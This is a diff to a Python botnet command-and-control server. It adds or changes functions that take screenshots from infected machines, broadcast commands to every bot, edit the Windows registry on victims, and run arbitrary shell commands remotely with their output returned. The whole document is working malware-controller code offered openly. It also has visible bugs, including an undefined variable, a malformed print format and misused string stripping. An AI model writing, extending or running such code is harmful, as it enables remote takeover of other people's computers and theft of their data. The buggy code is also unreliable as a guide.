@@ -152,6 +152,7 @@ def get_screenshot(addr):
         pass
     size = botnet[addr].recv(1024).decode()
     image = botnet[addr].recv(int(size))
+    image = b64.b64decode(data)
     check_container(addr)
     #os.chdir(addr)
     extension = ".png"
@@ -160,16 +161,19 @@ def get_screenshot(addr):
     file.close()
 
 def exec_command(cmd):
-    global botnet
-    print("[*] Sending Command Packets...")
-    sleep(1)
-    for bot in botnet:
-        botnet[bot].send(cmd.encode())
-        resp = botnet[bot].recv(1024).decode()
-        if(resp == "SUCCESS"):
-            print("[*] Command executed on %s"%(bot))
-        elif(resp == "FAILED"):
-            print("[*] Command execution failed on %s"%(bot))
+    try:
+        global botnet
+        print("[*] Sending Command Packets...")
+        sleep(1)
+        for bot in botnet:
+            botnet[bot].send(cmd.encode())
+            resp = botnet[bot].recv(1024).decode()
+            if(resp == "SUCCESS"):
+                print("[*] Command executed on %s"%(bot))
+            elif(resp == "FAILED"):
+                print("[*] Command execution failed on %s"%(bot))
+    except socket.error:
+        print("[*] %s : Dead"%(bot))
         #cmd_size = len(cmd)
         #packet = struct.pack("<H%ds"%(cmd_size),cmd_size,cmd) # H --> 2 Bytes Buffer Size
         #bot.send(packet)
@@ -178,11 +182,13 @@ def exec_command(cmd):
 def edit_registry():
     global botnet
     for bot in botnet:
+        print("[*] Editing windows registry on %s"(bot))
         botnet[bot].send("REGISTRY".encode())
         sleep(1)
         resp = botnet[bot].recv(1024).decode()
         if(resp == "OK"):
             sleep(1)
+            print("[*] Registry values added on %s"%(bot))
             pass
         elif(resp == "FAILED"):
             print("[*] Failed to edit registry on %s"%(bot))
@@ -218,10 +224,24 @@ def get_pid():
         except:
             print("[*] Failed to get PID from %s"%(bot))
 
+def process_shell(cmd):
+    global botnet
+    for bot in botnet:
+        print("[*] Executing shell on %s"%(bot))
+        botnet[bot].send("GETSHELL".encode())
+        sleep(1)
+        botnet[bot].send(cmd.encode())
+        resp = botnet[bot].recv(1024).decode()
+        if(resp == "DONE"):
+            print("[*] Shell Execution completed on %s"%(bot))
+            output = botnet[bot].recv(10240).decode()
+            print("%s output : %s"%(bot,output))
+        elif(resp == "FAILED"):
+            print("[*] Shell execution failed on %s"%(bot))
+
 def process_cmd(cmd):
         global botnet
         sleep(1)
-
         try:
             if "pid" in cmd:
                 get_pid()
@@ -251,10 +271,14 @@ def process_cmd(cmd):
             if(cmd == "get os"):
                 detect_os()
 
+            if "get shell" in cmd:
+                process_shell(cmd.strip("get shell "))
+
             if "shell" in cmd:
                 shell_exec(cmd)
 
-            if "registry" in cmd:
+            if "registry" in cmd or cmd == "edit registry":
+                print("[*] Starting registry edit...")
                 edit_registry()
 
             if 'test' in cmd:
@@ -268,6 +292,7 @@ def process_cmd(cmd):
             print("[*] Socket error")
         except:
             print("[*] Error occurred while processing command")
+            pass
 
 def main():
     try:
